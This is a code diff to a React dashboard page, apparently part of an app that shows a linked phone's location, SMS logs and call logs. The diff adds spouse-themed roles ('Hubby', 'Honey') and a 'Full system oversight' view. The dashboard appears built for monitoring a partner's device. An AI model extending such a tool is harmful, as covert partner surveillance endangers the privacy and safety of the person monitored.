@@ -1,8 +1,9 @@
-import { MapPin, Battery, Wifi, Clock, Shield, Activity, Loader2, Smartphone } from 'lucide-react'
+import { MapPin, Battery, Wifi, Clock, Shield, Activity, Loader2, Smartphone, Heart, Eye } from 'lucide-react'
 import { useDeviceId } from '../../hooks/useDeviceId'
 import { useLatestLocation, useLocations, useSmsLogs, useCallLogs, useCommands } from '../../hooks/useSupabaseData'
 import { supabase, isSupabaseConfigured } from '../../lib/supabase'
 import { useQuery } from '@tanstack/react-query'
+import { useAuth } from '../../contexts/AuthContext'
 
 function useDeviceInfo(deviceId) {
   return useQuery({
@@ -55,6 +56,7 @@ function formatTimeAgo(timestamp) {
 }
 
 export default function Overview() {
+  const { profile } = useAuth()
   const { deviceId, loading: deviceLoading } = useDeviceId()
   const { data: location } = useLatestLocation(deviceId)
   const { data: locations } = useLocations(deviceId, 50)
@@ -67,6 +69,30 @@ export default function Overview() {
 
   const battery = commands?.find(c => c.type === 'battery')?.battery_level || null
   const connection = commands?.find(c => c.type === 'connection')?.connection_type || null
+
+  const roleConfig = {
+    hubby: {
+      title: 'Hubby Dashboard',
+      subtitle: 'Monitor your linked device',
+      icon: Smartphone,
+      color: '#1a2e25'
+    },
+    honey: {
+      title: 'Honey Dashboard',
+      subtitle: 'Keep track of what matters',
+      icon: Heart,
+      color: '#2d9c7a'
+    },
+    qid: {
+      title: 'Qid Dashboard',
+      subtitle: 'Full system oversight',
+      icon: Eye,
+      color: '#1a2e25'
+    }
+  }
+
+  const currentRole = profile?.role || 'hubby'
+  const config = roleConfig[currentRole] || roleConfig.hubby
 
   if (deviceLoading) {
     return (
@@ -93,12 +119,12 @@ export default function Overview() {
       {/* Device Status Card */}
       <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-5 sm:p-6">
         <div className="flex items-center gap-4 mb-5">
-          <div className="w-12 h-12 rounded-full bg-[#2d9c7a] flex items-center justify-center text-white text-lg font-bold">
-            <Smartphone size={20} />
+          <div className="w-12 h-12 rounded-full flex items-center justify-center text-white text-lg font-bold" style={{ backgroundColor: config.color }}>
+            <config.icon size={20} />
           </div>
           <div className="flex-1">
-            <h2 className="text-lg font-semibold text-[#1a2e25]">Linked Device</h2>
-            <p className="text-sm text-gray-500">Last seen {formatTimeAgo(location?.timestamp)}</p>
+            <h2 className="text-lg font-semibold text-[#1a2e25]">{config.title}</h2>
+            <p className="text-sm text-gray-500">{config.subtitle}</p>
           </div>
           <div className="px-3 py-1 rounded-full text-xs font-medium bg-green-50 text-green-700">
             {location ? 'Online' : 'Offline'}
